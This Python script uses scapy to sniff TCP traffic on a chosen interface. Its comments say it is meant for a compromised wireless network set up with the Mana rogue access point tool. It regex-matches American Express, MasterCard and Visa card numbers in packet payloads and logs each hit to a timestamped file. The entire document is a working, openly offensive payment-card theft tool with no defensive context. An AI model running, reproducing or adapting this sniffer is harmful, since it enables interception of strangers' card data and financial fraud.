import re
import optparse
from scapy.all import *
from sys import argv
import time

# this sniffs for credit card info
# INSIDE of a compromised wireless networtk (little or no security)
# supposed to be used in conjunction with Mana

# Gets current date and time to use as a timestring
timestr = time.strftime("%Y%m%d-%H%M%S")

basic_Filename = "/root/ArmsCommander/logs/CreditCard_Captured_Creds_"
modified_Filename = basic_Filename + timestr + '.txt'

saved_Creds = open(modified_Filename, 'w')

def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall('3[47][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
    if americaRE:
        print '[+] Found American Express Card: ' + americaRE[0]
        saved_Creds.write('American Express: ' + americaRE[0] + '\n\r')
    if masterRE:
        print '[+] Found MasterCard Card: ' + masterRE[0]
        saved_Creds.write('MasterCard: ' + masterRE[0] + '\n\r')
    if visaRE:
        print '[+] Found Visa Card: ' + visaRE[0]
        saved_Creds.write('VISA: ' + visaRE[0] + '\n\r')

def main():
    parser = optparse.OptionParser('usage % prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface
    try:
        print '[*] Starting Credit Card Sniffer.'
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        saved_Creds.close()
        exit(0)

if __name__ == '__main__':
    main()
